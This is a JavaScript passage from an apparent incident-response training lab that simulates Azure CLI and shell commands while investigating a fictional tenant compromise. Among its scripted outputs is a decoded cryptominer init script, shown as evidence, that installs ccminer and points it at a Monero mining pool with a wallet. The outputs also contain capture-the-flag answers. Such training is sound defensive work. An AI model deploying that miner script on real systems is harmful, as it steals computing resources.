                        if (filterVal.includes('compute') || filterVal.includes('virtual')) {
                            entries = entries.filter(e => e.operationName.includes('virtualMachines'));
                        }
                        if (filterVal.includes('export') || filterVal.includes('sql')) {
                            entries = entries.filter(e => e.operationName.includes('export') || e.operationName.includes('Sql'));
                        }
                    }

                    if (entries.length === 0) return '(no matching activity log entries)';
                    let out = '';
                    entries.forEach(e => {
                        out += `---\ntimestamp: ${e.timestamp}\noperationName: ${e.operationName}\ncaller: ${e.caller}\nstatus: ${e.status}\nresourceGroup: ${e.resourceGroup}\nresource: ${e.resourceName}\ndescription: ${e.description}\n\n`;
                    });
                    return out.trim();
                }
                return 'Usage: az monitor activity-log list [--start-time <time>] [--filter <expr>]';
            }

            // az ad signin-logs list
            if (sub === 'ad') {
                if (args[1] === 'signin-logs' || (args[1] === 'signin' && args[2] === 'logs')) {
                    E1Config._signinLogsReviewed = true;
                    const logs = E1Config._azureData.signinLogs;
                    let out = '';
                    logs.forEach(l => {
                        out += `---\nid: ${l.id}\ntimestamp: ${l.timestamp}\nuser: ${l.userPrincipalName}\nip: ${l.ipAddress}\nlocation: ${l.location}\napp: ${l.appDisplayName}\nstatus: ${l.status}\nriskLevel: ${l.riskLevel}\nriskDetail: ${l.riskDetail}\ndevice: ${l.device}\n\n`;
                    });
                    return out.trim();
                }
                if (args[1] === 'user') {
                    if (args[2] === 'list') {
                        const users = E1Config._azureData.users;
                        let out = 'displayName              userPrincipalName                      jobTitle                  mfaEnabled   riskLevel\n';
                        out     += '------------------------ -------------------------------------- ------------------------- ----------- ----------\n';
                        users.forEach(u => {
                            out += `${u.displayName.padEnd(24)} ${u.userPrincipalName.padEnd(38)} ${u.jobTitle.padEnd(25)} ${String(u.mfaEnabled).padEnd(11)} ${u.riskLevel}\n`;
                        });
                        return out;
                    }
                    if (args[2] === 'revoke-sign-in-sessions') {
                        return '[+] All active sessions revoked for the specified account.\n[+] Access tokens invalidated. Refresh tokens disabled.\n[+] Attacker must re-authenticate — stolen token is now worthless.';
                    }
                    if (args[2] === 'update' && args.includes('--account-enabled') && args.includes('false')) {
                        return '[+] User account disabled. The account can no longer authenticate to Azure AD.';
                    }
                }
                if (args[1] === 'policy') {
                    return 'Conditional access policies require the Entra ID portal or Microsoft Graph API.\nNavigate to: https://portal.azure.local/entra/conditional-access';
                }
                return 'Usage: az ad user list | az ad signin-logs list | az ad user revoke-sign-in-sessions --id <upn>';
            }

            // az vm list
            if (sub === 'vm') {
                if (args[1] === 'list') {
                    E1Config._rogueVmsFound = true;
                    const vms = E1Config._azureData.virtualMachines;
                    const isTable = args.includes('-o') && args[args.indexOf('-o') + 1] === 'table';
                    if (isTable) {
                        let out = 'Name                  ResourceGroup           Location  VmSize          ProvisioningState  PowerState\n';
                        out    += '--------------------- ----------------------- --------- --------------- ------------------ ----------\n';
                        vms.forEach(v => {
                            out += `${v.name.padEnd(21)} ${v.resourceGroup.padEnd(23)} ${v.location.padEnd(9)} ${v.size.padEnd(15)} Succeeded          ${v.status}\n`;
                        });
                        return out;
                    }
                    return JSON.stringify(vms.map(v => ({ name: v.name, resourceGroup: v.resourceGroup, location: v.location, vmSize: v.size, powerState: v.status, tags: v.tags, created: v.created })), null, 2);
                }
                if (args[1] === 'delete') {
                    const vmName = args[args.indexOf('--name') + 1] || '';
                    if (vmName.includes('miner')) {
                        return `[+] VM ${vmName} deletion initiated...\n[+] Deallocating...\n[+] Deleting disks...\n[+] VM ${vmName} deleted successfully.\n[+] Billing stopped for Standard_NC6 GPU instance.`;
                    }
                    return `Error: VM ${vmName} not found or you don't have permission to delete it.`;
                }
                if (args[1] === 'show') {
                    const vmName = args[args.indexOf('--name') + 1] || args[2] || '';
                    const vm = E1Config._azureData.virtualMachines.find(v => v.name === vmName);
                    if (vm) return JSON.stringify(vm, null, 2);
                    return `Error: VM '${vmName}' not found.`;
                }
                return 'Usage: az vm list [-o table] | az vm delete --name <vm> -g <rg> | az vm show --name <vm> -g <rg>';
            }

            // az role assignment list / delete
            if (sub === 'role') {
                if (args[1] === 'assignment') {
                    if (args[2] === 'list') {
                        return '[\n  {\n    "principalName": "lena.kovacs@hexworth-corp.com",\n    "roleDefinitionName": "Global Administrator",\n    "scope": "/",\n    "createdOn": "2025-02-14T10:00:00Z"\n  },\n  {\n    "principalName": "x.phantom@protonmail.com",\n    "roleDefinitionName": "Global Administrator",\n    "scope": "/",\n    "createdOn": "2026-03-18T08:35:02Z",\n    "note": "UNAUTHORIZED — added by compromised account"\n  },\n  {\n    "principalName": "admin@hexworth-corp.com",\n    "roleDefinitionName": "Global Administrator",\n    "scope": "/",\n    "createdOn": "2024-06-01T09:00:00Z"\n  },\n  {\n    "principalName": "marcus.webb@hexworth-corp.com",\n    "roleDefinitionName": "User Access Administrator",\n    "scope": "/subscriptions/HEXWORTH-PROD-001",\n    "createdOn": "2025-03-10T14:30:00Z"\n  }\n]';
                    }
                    if (args[2] === 'delete') {
                        const assignee = args[args.indexOf('--assignee') + 1] || '';
                        if (assignee.includes('phantom')) {
                            return `[+] Role assignment deleted for ${assignee}.\n[+] Global Administrator privileges revoked.\n[+] Account no longer has admin access to the tenant.`;
                        }
                        return `Error: No matching role assignment found for ${assignee}.`;
                    }
                }
                return 'Usage: az role assignment list [--all] | az role assignment delete --assignee <upn> --role <role>';
            }

            // az network nsg rule list / delete
            if (sub === 'network') {
                if (args[1] === 'nsg' && args[2] === 'rule') {
                    if (args[3] === 'list') {
                        E1Config._nsgReviewed = true;
                        const rules = E1Config._azureData.nsgRules;
                        let out = 'Name                  Direction  Priority  Protocol  DestPort  Source       Access\n';
                        out    += '--------------------- ---------- --------- --------- --------- ------------ ------\n';
                        rules.forEach(r => {
                            const flag = r.rogue ? ' *** UNAUTHORIZED ***' : '';
                            out += `${r.name.padEnd(21)} ${r.direction.padEnd(10)} ${String(r.priority).padEnd(9)} ${r.protocol.padEnd(9)} ${r.destinationPortRange.padEnd(9)} ${r.sourceAddressPrefix.padEnd(12)} ${r.access}${flag}\n`;
                        });
                        return out;
                    }
                    if (args[3] === 'delete') {
                        const ruleName = args[args.indexOf('--name') + 1] || '';
                        if (ruleName.includes('rdp') || ruleName.includes('3389')) {
                            return `[+] NSG rule '${ruleName}' deleted.\n[+] RDP (3389) is no longer exposed to the internet.\n[+] Lateral movement risk via RDP eliminated.`;
                        }
                        return `Error: Rule '${ruleName}' not found.`;
                    }
                }
                return 'Usage: az network nsg rule list --nsg-name <nsg> -g <rg> | az network nsg rule delete --name <rule> --nsg-name <nsg> -g <rg>';
            }

            // az storage account list / delete
            if (sub === 'storage') {
                if (args[1] === 'account') {
                    if (args[2] === 'list') {
                        return '[\n  { "name": "sthexworthprod",  "resourceGroup": "rg-hexworth-data", "sku": "RA-GRS", "allowBlobPublicAccess": false, "creationTime": "2025-09-15" },\n  { "name": "stexfildata2026", "resourceGroup": "rg-hexworth-data", "sku": "RA-GRS", "allowBlobPublicAccess": true,  "creationTime": "2026-03-18", "note": "ROGUE — created by attacker" }\n]';
                    }
                    if (args[2] === 'delete') {
                        const acctName = args[args.indexOf('--name') + 1] || '';
                        if (acctName.includes('exfil')) {
                            return `[+] Storage account '${acctName}' deleted.\n[+] All blobs including crm-export-20260318.bacpac destroyed.\n[+] External access to exfiltrated data severed.`;
                        }
                        return `Error: Storage account '${acctName}' not found.`;
                    }
                }
                return 'Usage: az storage account list | az storage account delete --name <acct> -g <rg>';
            }

            // az deployment group show (ARM template retrieval)
            if (sub === 'deployment') {
                if (args[1] === 'group' && args[2] === 'show') {
                    E1Config._armTemplateFound = true;
                    return '{\n  "name": "deploy-miner-arm-01",\n  "resourceGroup": "rg-hexworth-compute",\n  "timestamp": "2026-03-18T09:02:01Z",\n  "provisioningState": "Succeeded",\n  "templateLink": null,\n  "template": {\n    "resources": [\n      {\n        "type": "Microsoft.Compute/virtualMachines",\n        "properties": {\n          "osProfile": {\n            "customData": "IyEvYmluL2Jhc2gKIyBYTVIgTW9uZXJvIE1pbmVyIEluaXQgU2NyaXB0CiMgT3BlcmF0b3I6IHgucGhhbnRvbUBwcm90b25tYWlsLmNvbQojCiMgRkxBRzoge3tGTEFHOnJvb3R9fQojCmNjbWluZXIgLW8gc3RyYXR1bSt0Y3A6Ly9wb29sLm1pbmV4bXIuY29tOjQ0NDQ="\n          }\n        }\n      }\n    ]\n  }\n}\n\n[!] Tip: decode the customData field with: echo <base64> | base64 -d\n[!] Or read the pre-decoded version: cat /home/analyst/evidence/arm-templates/arm-decode.txt';
                }
                return 'Usage: az deployment group show -g <rg> -n <deployment-name>\nExample: az deployment group show -g rg-hexworth-compute -n deploy-miner-arm-01';
            }

            // az sentinel
            if (sub === 'sentinel') {
                if (args[1] === 'alert' || args[1] === 'incident') {
                    E1Config._sentinelReviewed = true;
                    const a = E1Config._azureData.sentinelAlert;
                    return `Alert ID: ${a.alertId}\nName: ${a.alertName}\nSeverity: ${a.severity}\nStatus: ${a.status}\nCreated: ${a.createdTime}\nAffected: ${a.affectedEntities.join(', ')}\n\nDescription:\n${a.description}\n\nRecommended Steps:\n${a.investigationSteps.join('\n')}`;
                }
                return 'Usage: az sentinel incident show --id INC-2026-0087\nOr open the browser to https://sentinel.azure.local';
            }

            return `az: '${sub}' is not an az command. See 'az --help'.`;
        },

        // ── base64 decode ──
        'base64': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('-d') || fullCmd.includes('--decode')) {
                // Simulate decoding the ARM template customData
                const knownB64 = 'IyEvYmluL2Jhc2gKIyBYTVIgTW9uZXJvIE1pbmVyIEluaXQgU2NyaXB0CiMgT3BlcmF0b3I6IHgucGhhbnRvbUBwcm90b25tYWlsLmNvbQo=';
                const inputVal = args.find(a => !a.startsWith('-') && a.length > 10) || '';
                if (inputVal.startsWith('IyEvYmlu') || inputVal.startsWith('IyEvYmlu') || fullCmd.includes('IyEvYmlu')) {
                    E1Config._armTemplateFound = true;
                    return '#!/bin/bash\n# XMR Monero Miner Init Script\n# Operator: x.phantom@protonmail.com\n\napt-get update -y && apt-get install -y ccminer libcurl4-openssl-dev\n\n# Pool: pool.minexmr.com:4444\n# Wallet: 49vjK4WXL8tu34ZhZ2yBUEuEHGwURMnxqJNfByGPrgAsRGT7A9wPkjdJxDJ\n#\n# FLAG: {{FLAG:root}}\n#\nccminer -o stratum+tcp://pool.minexmr.com:4444 -u 49vjK4WXL8tu34ZhZ2yBUEuEHGwURMnxqJNfByGPrgAsRGT7A9wPkjdJxDJ -p x.0 --max-temp 85 --num-threads 6 &\necho "[miner] started" >> /var/log/miner.log';
                }
                return 'base64: invalid input';
            }
            return 'Usage: base64 -d <file> | echo <string> | base64 -d';
        },

        // ── jq ──
        'jq': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('customData') || fullCmd.includes('osProfile')) {
                E1Config._armTemplateFound = true;
                return '"IyEvYmluL2Jhc2gKIyBYTVIgTW9uZXJvIE1pbmVyIEluaXQgU2NyaXB0CiMgT3BlcmF0b3I6IHgucGhhbnRvbUBwcm90b25tYWlsLmNvbQojCiMgRkxBRzoge3tGTEFHOnJvb3R9fQo="\n\n[!] Tip: pipe this through: | tr -d \'"\' | base64 -d';
            }
            if (fullCmd.includes('description') || fullCmd.includes('classification') || fullCmd.includes('FLAG')) {
                return '"Database export initiated: sqldb-hexworth-crm -> stexfildata2026/crm-export-20260318.bacpac (6.4GB). Data classification tag: {{FLAG:internal}}"';
            }
            return 'jq: usage: jq [filter] [file]\nExample: jq \'.[] | .description\' /home/analyst/evidence/activity-log-raw.json';
        },

        // ── grep ──
        'grep': function(args) {
            const fullCmd = args.join(' ');
            // Grepping for the classification tag / flag in activity log
            if (fullCmd.includes('classification') || fullCmd.includes('export') || (fullCmd.includes('activity') && fullCmd.toLowerCase().includes('flag'))) {
                return '"description": "Database export initiated: sqldb-hexworth-crm -> stexfildata2026/crm-export-20260318.bacpac (6.4GB). Data classification tag: {{FLAG:internal}}"';
            }
            // Grepping for Return-Path in phishing email
            if (fullCmd.includes('Return-Path') || fullCmd.includes('return-path') || (fullCmd.includes('phish') && fullCmd.includes('Return'))) {
                return 'Return-Path: {{FLAG:user}}';
            }
            // Grepping for FLAG in arm-decode.txt
            if (fullCmd.includes('FLAG') && (fullCmd.includes('arm') || fullCmd.includes('cryptominer') || fullCmd.includes('miner'))) {
                E1Config._armTemplateFound = true;
                return '# FLAG: {{FLAG:root}}';
            }
            // Generic grep hint
            if (fullCmd.includes('FLAG')) {
                return '[grep] No match — try being more specific about the file path.';
            }
            return '[grep] 0 matches';
        },

        // ── curl (simulated — Azure REST API calls) ──
        'curl': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('management.azure.com') && fullCmd.includes('activitylog')) {
                E1Config._activityLogReviewed = true;
                return '{"value": [{"timestamp": "2026-03-18T09:14:22Z", "operationName": {"value": "Microsoft.Sql/servers/databases/export"}, "caller": "x.phantom@protonmail.com", "status": {"value": "Succeeded"}, "description": "Database export: sqldb-hexworth-crm (6.4GB). Classification tag: {{FLAG:internal}}"}]}';
            }
            if (fullCmd.includes('graph.microsoft.com') && fullCmd.includes('signin')) {
                return '{"value": [{"id": "signin-001", "createdDateTime": "2026-03-18T07:14:22Z", "userPrincipalName": "lena.kovacs@hexworth-corp.com", "ipAddress": "81.23.14.55", "location": {"city": "Budapest", "countryOrRegion": "HU"}, "riskDetail": "Impossible travel"}]}';
            }
            return 'curl: For Azure API calls use: curl -H "Authorization: Bearer $TOKEN" https://management.azure.com/...\nOr use the az CLI commands instead.';
        },

        // ── whois / dig — for analyzing attacker infrastructure ──
        'whois': function(args) {
            const target = args[0] || '';
            if (target.includes('micros0ft-teams-notify') || target.includes('81.23.14')) {
                return `Domain Name: MICROS0FT-TEAMS-NOTIFY.COM\nRegistrar: NameCheap, Inc.\nCreated: 2026-03-14\nExpires: 2027-03-14\nRegistrant Country: Undisclosed (GDPR Redacted)\nName Server: ns1.anonymousdns.net\n\nIP: 81.23.14.55\nASN: AS60068\nCountry: Hungary\nCity: Budapest\nOrg: DataCenter Services Ltd.\n\n[Threat Intel] This IP matches the impossible travel login source. Domain registered 3 days before phishing campaign.`;
            }
            return `whois: ${target}: no data`;
        },

        'dig': function(args) {
            const target = args.find(a => !a.startsWith('-') && !a.startsWith('@')) || '';
            if (target.includes('micros0ft') || target.includes('81.23.14')) {
                return `; <<>> DiG 9.18.19 <<>> ${target}\n;; ANSWER SECTION:\n${target}. 300 IN A 81.23.14.55\n\n;; Query time: 18 msec\n;; SERVER: 8.8.8.8#53\n[!] Domain is active — attacker C2 infrastructure still live.`;
            }
            return `; <<>> DiG 9.18.19 <<>> ${target}\n;; NXDOMAIN — host not found.`;
        },

        // ── Context-aware overrides ──
        'whoami': function(args) {
            return 'analyst';
        },

        'id': function(args) {
            return 'uid=1000(analyst) gid=1000(analyst) groups=1000(analyst),4(adm),27(sudo)';
        },

        'hostname': function(args) {
            return 'azure-inv-ws';
        },

        'uname': function(args) {
            const a = args.join(' ');
            if (a.includes('-a')) return 'Linux azure-inv-ws 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux';
            return 'Linux';
        },

        // ── Containment commands ──
        'bash': function(args) {
            const script = args.find(a => a.includes('.sh') || a.includes('playbook'));
            if (script && script.includes('playbook')) {
                E1Config._containmentExecuted = true;
                return '[+] Executing containment playbook...\n[+] Sessions revoked for lena.kovacs@hexworth-corp.com\n[+] Role assignment deleted: x.phantom@protonmail.com (Global Administrator)\n[+] Account disabled: x.phantom@protonmail.com\n[+] VM vm-miner-node-01 deleted\n[+] VM vm-miner-node-02 deleted\n[+] VM vm-miner-node-03 deleted\n[+] NSG rule allow-rdp-internet deleted\n[+] Storage account stexfildata2026 deleted\n[+] Containment complete. Azure subscription secured.\n\nRemaining actions (manual):\n  - Re-enable and re-register MFA for lena.kovacs@hexworth-corp.com\n  - Restore conditional access policy from backup\n  - Rotate all service principal credentials\n  - File formal incident report';
            }
            return 'Usage: bash <script.sh>\nExample: bash /home/analyst/containment/playbook.sh';
        },

        'ping': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '8.8.8.8' || target === 'google.com') {
                return `PING ${target}: 56 data bytes\n64 bytes from ${target}: icmp_seq=0 ttl=117 time=14.2 ms\n64 bytes from ${target}: icmp_seq=1 ttl=117 time=13.8 ms\n--- ${target} ping statistics ---\n2 packets transmitted, 2 packets received, 0.0% packet loss`;
            }
            if (target === '81.23.14.55') {
                return `PING 81.23.14.55: 56 data bytes\n64 bytes from 81.23.14.55: icmp_seq=0 ttl=48 time=122.4 ms\n64 bytes from 81.23.14.55: icmp_seq=1 ttl=48 time=119.7 ms\n--- 81.23.14.55 ping statistics ---\n2 packets transmitted, 2 packets received, 0.0% packet loss\n\n[!] This is the attacker C2 IP — Budapest, Hungary.`;
            }
            return `ping: ${target}: Name or service not known`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#0078d4; border-bottom:2px solid #ddd; background:#f0f6ff;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #eee;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
